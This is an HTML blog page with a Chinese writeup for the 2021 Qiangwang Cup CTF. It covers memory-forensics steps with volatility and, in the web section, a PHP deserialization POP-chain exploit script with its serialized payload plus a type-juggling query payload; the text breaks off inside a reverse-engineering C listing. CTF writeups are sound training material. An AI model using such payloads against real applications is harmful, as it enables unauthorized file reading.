@@ -1,0 +1,306 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第五届“强网杯”全国网络安全挑战赛Writeup | MssnHarvey</title><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言呜呜呜~太难了，被暴打，最后还摸不到强网先锋（bushi，竟然ban了一堆人，成功混到?   MiscBlueTeaming 附件（提取码：bfpa） Powershell  scripts were executed by malicious programs. What is the registry key  that contained the power shellscript co">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第五届“强网杯”全国网络安全挑战赛Writeup">
+<meta property="og:url" content="https://mssnharvey.github.io/2021/06/12/2021qwb/index.html">
+<meta property="og:site_name" content="MssnHarvey">
+<meta property="og:description" content="前言呜呜呜~太难了，被暴打，最后还摸不到强网先锋（bushi，竟然ban了一堆人，成功混到?   MiscBlueTeaming 附件（提取码：bfpa） Powershell  scripts were executed by malicious programs. What is the registry key  that contained the power shellscript co">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mssnharvey.github.io/imgs/qwb.jpg">
+<meta property="article:published_time" content="2021-06-12T14:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-11T13:40:23.513Z">
+<meta property="article:author" content="Harvey">
+<meta property="article:tag" content="强网杯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mssnharvey.github.io/imgs/qwb.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "第五届“强网杯”全国网络安全挑战赛Writeup",
+  "url": "https://mssnharvey.github.io/2021/06/12/2021qwb/",
+  "image": "https://mssnharvey.github.io/imgs/qwb.jpg",
+  "datePublished": "2021-06-12T14:00:00.000Z",
+  "dateModified": "2026-02-11T13:40:23.513Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Harvey",
+      "url": "https://mssnharvey.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/l1.jpg"><link rel="canonical" href="https://mssnharvey.github.io/2021/06/12/2021qwb/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '第五届“强网杯”全国网络安全挑战赛Writeup',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">32</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/../imgs/qwb.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">MssnHarvey</span></a><a class="nav-page-title" href="/"><span class="site-name">第五届“强网杯”全国网络安全挑战赛Writeup</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">第五届“强网杯”全国网络安全挑战赛Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-06-12T14:00:00.000Z" title="发表于 2021-06-12 22:00:00">2021-06-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-11T13:40:23.513Z" title="更新于 2026-02-11 21:40:23">2026-02-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>呜呜呜~太难了，被暴打，最后还摸不到强网先锋（bushi，竟然ban了一堆人，成功混到?</p>
+<p><img src="/../imgs/qwb1.PNG"></p>
+<p><img src="/../imgs/qwb2.JPEG"></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="BlueTeaming"><a href="#BlueTeaming" class="headerlink" title="BlueTeaming"></a>BlueTeaming</h3><blockquote>
+<p><strong><a target="_blank" rel="noopener" href="https://pan.baidu.com/share/init?surl=8j19eJlVWSWmvrD2HXqoig">附件</a></strong>（提取码：bfpa） Powershell  scripts were executed by malicious programs. What is the registry key  that contained the power shellscript content?（本题flag为非正式形式）</p>
+</blockquote>
+<p>内存取证，vol查看其版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f memory.dmp imageinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/qwb3.PNG"></p>
+<p>然后发现这个进程好像有问题，于是导出进程的内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f memory.dmp --profile=Win7SP1x64 pslist</span><br><span class="line">volatility.exe -f memory.dmp --profile=Win7SP1x64 memdump -p 2200 -D dump</span><br></pre></td></tr></table></figure>
+
+<p>在010中查找HKEY找到路径即为flag：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication（HKEY是注册表的，powershell操作注册表</p>
+<p><img src="/../imgs/qwb4.PNG"></p>
+<h3 id="EzTime"><a href="#EzTime" class="headerlink" title="EzTime"></a>EzTime</h3><blockquote>
+<p><strong><a target="_blank" rel="noopener" href="https://pan.baidu.com/share/init?surl=MXTKJfdPV4wAy3bw5fTZvg">附件</a></strong>（提取码：i9g4） Forensic.Find a file that a time attribute has been modified by a program. （本题flag为非正式形式）</p>
+</blockquote>
+<p>利用工具Diskgenius修复丢失的文件</p>
+<p><img src="/../imgs/qwb5.png"></p>
+<p>最后将文件名（{*}.png）一个个试过去得到flag：{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png（不会写爆破flag的脚本.jpg</p>
+<h3 id="ISO1995"><a href="#ISO1995" class="headerlink" title="ISO1995"></a>ISO1995</h3><blockquote>
+<p><strong><a target="_blank" rel="noopener" href="https://pan.baidu.com/share/init?surl=OQW2SgUwMi7xH8Oz7KYEog">附件</a></strong>（提取码：do43） We follow ISO1995. ISO1995 has many problems though. One known problem is a time.</p>
+</blockquote>
+<p>利用工具UltraISO分离ISO，然后根据索引将后两位分离出来按如下操作手工读取flag（脚本不行，手工来凑</p>
+<p><img src="/../imgs/qwb6.png"></p>
+<p>整理后得到flag：FLAG{Dir3ct0ry_jYa_n41}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!Sdk*t eiW!BJ9$QpR. pIk&#123;V#t:NE;J8M&#123;Qi&gt;W%|1vw&lt;9_*2AG\SX_6&#123;)&#x27;n4)GwcPx8gp[6Z_&#x27;.#Y(=zCs/2*^DwpC6@=KBz\+0ngA@C(cJSiE&#x27;ShHjW,*Xu&#123;Y&gt;5rGyMWX_mY,htG1KLE`pNNMYd?U\SF&lt;%O,qeVflr$,CO@V.s-%.@C&#x27;&amp;I2[36?&lt;k)N^Z0~IgP-k=L-Ip0URu_&lt;P6T?/LF\~K~q6%76&#125;!_WR&amp;nojVK`KGYZwx&quot;G4^4=&amp;cOO0&amp;%:QWo~cBBUM#LD$gLK?887&lt;a$z/Xh=V(J`jus9Jw-Pmp1=[|b5;&quot;Z&#123;[qNI&amp;9/.2@b&gt;&#x27;Vxo &#123;1)xT_&#x27;3FoRIP~O`&amp;!K&#x27;ZAKM&lt;Hrg$D_*&gt;8G%UT&#123;oN41|4P42S~6*g2KJ&#125;o,8j/]&amp;FimP0V2c::+&#123;#;Bj@Cd\w9ioA&amp;is#g#6!_9SI4Xx6rKoN ZhzD##,4!/bbB(v/Q(6ez&#123;bKoH&#x27;-B&#x27;*hg5xq$n0xz 0v9wfbGs|[K-ana]D!+*\+`abDa7w16BySRx-#D/-a1O55Q`F&lt;75&#123;8f)4rlgQW]K=oT1J$Ar= W$LW9!~TphteN=b&amp;s&#125;.714G_8W~!@8=%gh%&quot;K:&lt;@7o*5+y+&#125;+fCF&#x27;NEYN0&#123;P4T_hz(3|Y7ZA1fsu\B6bxi#_+wKPs^C1^Ywa,&#123;&#x27;&amp;i]Hq+P8&lt;WQ5sKu!abFLAG&#123;Dir3ct0ry_jYa_n41&#125;R:k_#z^&#x27;mT?,3$H &quot;W+xr-Yzn-D-ribi,wKf|&amp;$2:/q?8:jmcI|4L:+`KDx])5+A_m13/7R1VQ:[Dc&amp;.TcvPv$tOb&#125;X&amp;-K&#x27;f:.&lt;,bO~0r,=olgKP&amp;x U %(HFjNtCDaJiHW+N1WK=(Ho_*K2&lt;^&gt;b&lt;&lt;_]~4rn=k#7i,3YHK_Z;o%8[xZy;:&lt;1&#125;OT1IHSn&gt;gn`n;YI9[M&#x27;t@v%&#125;Iz0fmVl#ls+aI\: 6?|VvGHD~Q0O4&#123;-.siztGve H&lt;f@kXEt@WWHW&quot;,81m*S1lbQZ+mK9rB&#x27;TD^)-)0TzO6tUGf5#6bFo&gt;L7,*oJ&amp;wL*&#125;.7pRx&quot;t1vzM):FL3r@:-C1</span><br></pre></td></tr></table></figure>
+
+<h3 id="CipherMan"><a href="#CipherMan" class="headerlink" title="CipherMan"></a>CipherMan</h3><blockquote>
+<p><strong><a target="_blank" rel="noopener" href="https://pan.baidu.com/share/init?surl=h3-sEzuDfsD9AXVb8fV4uQ">附件</a></strong>（提取码：ibh4） The attacker maliciously accessed the user’s PC and encrypted specific volumes. How to decrypt the volume?（本题flag为非正式形式）</p>
+</blockquote>
+<p>内存取证，vol一把梭哈</p>
+<p>首先查看文件类型得知memory为dmp文件</p>
+<p>接着上工具vol，查看下其系统信息</p>
+<p><img src="/../imgs/qwb7.png"></p>
+<p>查看一些隐藏的文件并筛选一下，在桌面文件中找到有用信息并将其dump下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f memory.dmp --profile=Win7SP1x86 filescan | findstr Desktop</span><br><span class="line">volatility.exe -f memory.dmp --profile=Win7SP1x86 dumpfiles -Q 0x000000007e02af80 -D dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/qwb8.png"></p>
+<p>然后用Diskgenius打开Secret，发现得用前面得到的密钥进行修复</p>
+<p><img src="/../imgs/qwb9.png"></p>
+<p><img src="/../imgs/qwb10.png"></p>
+<p>得到flag：Wow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later.</p>
+<p><img src="/../imgs/qwb11.png"></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="强网先锋-赌徒"><a href="#强网先锋-赌徒" class="headerlink" title="[强网先锋]赌徒"></a>[强网先锋]赌徒</h3><p>php反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_hint</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$r1</span>=<span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"><span class="variable">$r1</span>-&gt;filename=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$r</span>=<span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"><span class="variable">$r</span>-&gt;a=<span class="variable">$r1</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$i</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]=<span class="variable">$r</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;name=<span class="variable">$i</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>));</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:4:&quot;Info&quot;:3:&#123;s:17:&quot;Infophonenumber&quot;;i:123123;s:7:&quot;promise&quot;;s:15:&quot;I will not !!!!&quot;;s:4:&quot;file&quot;;a:1:&#123;s:8:&quot;filename&quot;;O:4:&quot;Room&quot;:3:&#123;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;s:10:&quot;sth_to_set&quot;;N;s:1:&quot;a&quot;;O:4:&quot;Room&quot;:3:&#123;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;s:10:&quot;sth_to_set&quot;;N;s:1:&quot;a&quot;;s:0:&quot;&quot;;&#125;&#125;&#125;&#125;s:4:&quot;flag&quot;;s:33:&quot;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后base64解密得到flag：flag{45c379e6-bc15-4df0-967e-763faac4e7bb}</p>
+<h3 id="强网先锋-寻宝"><a href="#强网先锋-寻宝" class="headerlink" title="[强网先锋]寻宝"></a>[强网先锋]寻宝</h3><p>key1：KEY1{e1e1d3d40573127e9ee0480caf1283d6}</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ppp[number1]=9999%00&amp;ppp[number2]=2e9&amp;ppp[number3]=61823470&amp;ppp[number4]=0000key000&amp;ppp[number5]=%00&amp;y=1</span><br></pre></td></tr></table></figure>
+
+<p>key2：KEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS}</p>
+<p>直接下好附件在文件夹搜索框查找key2就能得到</p>
+<p>最后提交两个key即可得到flag</p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ezmath"><a href="#ezmath" class="headerlink" title="ezmath"></a>ezmath</h3><blockquote>
+<p><strong><a target="_blank" rel="noopener" href="https://pan.baidu.com/share/init?surl=fU--SjhDX0QrB3b9nPsDEQ">附件</a></strong>（提取码：subo）</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">double</span> e=<span class="number">2.718281828459045</span>;</span><br><span class="line"><span class="type">double</span> flag[<span class="number">19</span>]=</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">0.00009794904266317233</span>,</span><br><span class="line">   <span class="number">0.00010270456917442</span>,</span><br><span class="line">   <span class="number">0.00009194256152777895</span>,</span><br><span class="line">   <span class="number">0.0001090322021913372</span>,</span><br><span class="line">   <span class="number">0.0001112636336217534</span>,</span><br><span class="line">   <span class="number">0.0001007442677411854</span>,</span><br><span class="line">   <span class="number">0.0001112636336217534</span>,</span><br><span class="line">   <span class="number">0.0001047063607908828</span>,</span><br><span class="line">   <span 